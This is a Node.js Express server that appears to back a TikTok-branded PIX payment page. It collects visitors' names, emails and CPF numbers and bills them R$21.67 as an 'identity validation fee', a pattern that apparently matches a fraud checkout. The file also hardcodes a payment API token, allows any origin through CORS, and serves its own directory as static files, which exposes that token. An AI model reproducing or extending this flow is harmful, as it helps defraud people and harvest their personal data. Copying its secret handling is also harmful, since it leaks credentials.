const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// Configuração da Plumify
const PLUMIFY_CONFIG = {
    token: '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa',
    accountId: '9kajnnbn2c',
    baseURL: 'https://api.plumify.com.br/api/public/v1',
    productHash: 'flnqw8vjsf'
};

// Middlewares
app.use(express.json());
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    next();
});

// Servir arquivos estáticos (HTML, CSS, imagens)
app.use(express.static(__dirname));

// Rota raiz - serve seu index.html
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Rota de teste
app.get('/api/test', (req, res) => {
    res.json({ 
        success: true, 
        message: '✅ API TikTok PIX funcionando!',
        timestamp: new Date().toISOString()
    });
});

// Rota para criar PIX
app.post('/api/pix/create', async (req, res) => {
    try {
        const { customerName, customerEmail, customerCpf } = req.body;
        
        if (!customerName || !customerEmail || !customerCpf) {
            return res.status(400).json({
                success: false,
                error: 'Preencha: nome, email e CPF'
            });
        }
        
        const cpfClean = customerCpf.replace(/\D/g, '');
        
        const payload = {
            api_token: PLUMIFY_CONFIG.token,
            amount: 2167,
            payment_method: "pix",
            customer: {
                name: customerName,
                email: customerEmail,
                phone_number: "61995512071",
                document: cpfClean,
                zip_code: "00000000",
                street_name: "Rua",
                number: "0000",
                complement: "",
                neighborhood: "Bairro",
                city: "Cidade",
                state: "SP",
                country: "br"
            },
            cart: [
                {
                    product_hash: PLUMIFY_CONFIG.productHash,
                    title: "Taxa de Validação de Identidade",
                    price: 2167,
                    quantity: 1,
                    tangible: false,
                    requires_shipping: false,
                    operation_type: 1
                }
            ],
            offer_hash: `tiktok_${Date.now()}`,
            expire_in_days: 1,
            transaction_origin: "web"
        };
        
        const response = await axios.post(
            `${PLUMIFY_CONFIG.baseURL}/transactions`,
            payload,
            {
                headers: { 'Content-Type': 'application/json' },
                timeout: 15000
            }
        );
        
        const data = response.data;
        
        const result = {
            success: true,
            transaction: {
                id: data.id || data.hash,
                status: data.payment_status || 'waiting_payment',
                amount: 21.67,
                pix_code: data.pix?.pix_qr_code || data.qr_code || '',
                pix_url: data.pix?.pix_url || data.qr_code_image || ''
            }
        };
        
        // Se não tem URL do QR Code, gera uma
        if (result.transaction.pix_code && !result.transaction.pix_url) {
            result.transaction.pix_url = 
                `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(result.transaction.pix_code)}`;
        }
        
        res.json(result);
        
    } catch (error) {
        console.error('Erro:', error.message);
        res.status(500).json({
            success: false,
            error: error.response?.data?.message || error.message
        });
    }
});

// Rota para status do PIX
app.get('/api/pix/status/:id', async (req, res) => {
    try {
        const response = await axios.get(
            `${PLUMIFY_CONFIG.baseURL}/transactions/${req.params.id}`,
            {
                headers: { 'Authorization': `Bearer ${PLUMIFY_CONFIG.token}` }
            }
        );
        
        res.json({
            success: true,
            transaction: response.data
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Rota para página de checkout
app.get('/checkout/pagamento', (req, res) => {
    res.sendFile(__dirname + '/checkout/pagamento.html');
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`🚀 API TikTok PIX rodando na porta ${PORT}`);
    console.log(`🌐 Site: http://localhost:${PORT}`);
    console.log(`📡 API: http://localhost:${PORT}/api/test`);
    console.log(`💰 Checkout: http://localhost:${PORT}/checkout/pagamento`);
});
const path = require('path');

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'pagamento.html'));
});
